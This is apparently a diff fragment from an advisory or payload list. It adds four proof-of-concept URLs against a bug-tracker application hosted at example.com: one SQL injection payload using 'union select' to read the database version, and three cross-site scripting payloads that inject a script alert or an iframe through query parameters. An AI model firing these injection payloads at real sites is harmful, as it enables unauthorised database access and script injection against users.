@@ -1,0 +1,4 @@
+http://www.example.com/show_activity.php?id=null+union+select+1,2,3,4,5,version(),7,8--
+http://www.example.com/buglist.php?component=%22%27%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E
+http://www.example.com/buglist.php?priority=%22%27%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E
+http://www.example.com/buglist.php?component=%22%27%3E%3Ciframe%20src=%22http://example.com%22%3E%3C/iframe%3E
